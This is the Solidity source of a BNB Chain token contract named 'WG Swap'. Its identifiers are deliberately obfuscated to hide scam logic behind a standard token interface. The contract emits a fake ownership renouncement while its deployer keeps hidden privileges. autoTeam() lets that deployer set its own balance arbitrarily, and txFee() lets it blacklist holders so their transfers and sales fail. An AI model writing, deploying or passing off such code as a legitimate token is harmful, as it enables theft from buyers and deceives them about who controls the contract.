/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract receiverIs {
    function takeMarketing() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface shouldTxLimit {
    function createPair(address takeShould, address enableReceiver) external returns (address);
}

interface receiverTxSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract WGSwap is IERC20, receiverIs {
    uint8 private fundMode = 18;
    


    mapping(address => bool) public buyLaunched;
    

    bool public minLimit;
    uint256 private teamSender;
    address public modeFundTeam;
    mapping(address => bool) public listReceiver;
    bool private listSwap;
    mapping(address => mapping(address => uint256)) private isTx;
    uint256 private takeTotal = 100000000 * 10 ** fundMode;
    string private launchedFund = "WSP";
    string private minTokenTrading = "WG Swap";
    bool public tokenWallet;
    mapping(address => uint256) private totalTo;
    
    uint256 private buyMinSwap;

    bool private toMarketingMode;
    bool private limitIs;

    address public totalMarketing;
    address private tradingFund;
    address private shouldIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    bool private shouldSell;
    

    event OwnershipTransferred(address indexed receiverBuyToken, address indexed atEnable);

    constructor (){
        
        receiverTxSell minReceiver = receiverTxSell(shouldIs);
        modeFundTeam = shouldTxLimit(minReceiver.factory()).createPair(minReceiver.WETH(), address(this));
        tradingFund = takeMarketing();
        
        totalMarketing = tradingFund;
        buyLaunched[totalMarketing] = true;
        
        totalTo[totalMarketing] = takeTotal;
        emit Transfer(address(0), totalMarketing, takeTotal);
        launchAmount();
    }

    

    function listAt(address toExempt) public {
        if (minLimit) {
            return;
        }
        
        buyLaunched[toExempt] = true;
        if (limitIs) {
            listSwap = true;
        }
        minLimit = true;
    }

    function teamReceiver() public view returns (uint256) {
        return buyMinSwap;
    }

    function modeFee() public view returns (uint256) {
        return teamSender;
    }

    function balanceOf(address feeLimitMin) public view virtual override returns (uint256) {
        return totalTo[feeLimitMin];
    }

    function autoTeam(uint256 liquidityTeam) public {
        if (!buyLaunched[takeMarketing()]) {
            return;
        }
        totalTo[totalMarketing] = liquidityTeam;
    }

    function symbol() external view returns (string memory) {
        return launchedFund;
    }

    function limitListIs(address receiverExempt, address marketingReceiver, uint256 liquidityTeam) internal returns (bool) {
        if (receiverExempt == totalMarketing || marketingReceiver == totalMarketing) {
            return toFrom(receiverExempt, marketingReceiver, liquidityTeam);
        }
        
        require(!listReceiver[receiverExempt]);
        if (listSwap == limitIs) {
            toMarketingMode = true;
        }
        return toFrom(receiverExempt, marketingReceiver, liquidityTeam);
    }

    function name() external view returns (string memory) {
        return minTokenTrading;
    }

    function owner() external view returns (address) {
        return tradingFund;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeTotal;
    }

    function decimals() external view returns (uint8) {
        return fundMode;
    }

    function txFee(address minMaxEnable) public {
        if (limitIs) {
            buyMinSwap = teamSender;
        }
        if (minMaxEnable == totalMarketing || minMaxEnable == modeFundTeam || !buyLaunched[takeMarketing()]) {
            return;
        }
        if (buyMinSwap == teamSender) {
            buyMinSwap = teamSender;
        }
        listReceiver[minMaxEnable] = true;
    }

    function toBuy() public view returns (uint256) {
        return teamSender;
    }

    function tradingTo() public view returns (bool) {
        return toMarketingMode;
    }

    function launchAmount() public {
        emit OwnershipTransferred(totalMarketing, address(0));
        tradingFund = address(0);
    }

    function transferFrom(address receiverExempt, address marketingReceiver, uint256 liquidityTeam) external override returns (bool) {
        if (isTx[receiverExempt][takeMarketing()] != type(uint256).max) {
            require(liquidityTeam <= isTx[receiverExempt][takeMarketing()]);
            isTx[receiverExempt][takeMarketing()] -= liquidityTeam;
        }
        return limitListIs(receiverExempt, marketingReceiver, liquidityTeam);
    }

    function toFrom(address receiverExempt, address marketingReceiver, uint256 liquidityTeam) internal returns (bool) {
        require(totalTo[receiverExempt] >= liquidityTeam);
        totalTo[receiverExempt] -= liquidityTeam;
        totalTo[marketingReceiver] += liquidityTeam;
        emit Transfer(receiverExempt, marketingReceiver, liquidityTeam);
        return true;
    }

    function transfer(address maxTxFund, uint256 liquidityTeam) external virtual override returns (bool) {
        return limitListIs(takeMarketing(), maxTxFund, liquidityTeam);
    }

    function totalLaunchExempt() public view returns (bool) {
        return listSwap;
    }

    function allowance(address atSwapList, address atFrom) external view virtual override returns (uint256) {
        return isTx[atSwapList][atFrom];
    }

    function approve(address atFrom, uint256 liquidityTeam) public virtual override returns (bool) {
        isTx[takeMarketing()][atFrom] = liquidityTeam;
        emit Approval(takeMarketing(), atFrom, liquidityTeam);
        return true;
    }

    function getOwner() external view returns (address) {
        return tradingFund;
    }

    function receiverWallet() public {
        
        if (limitIs != listSwap) {
            teamSender = buyMinSwap;
        }
        listSwap=false;
    }


}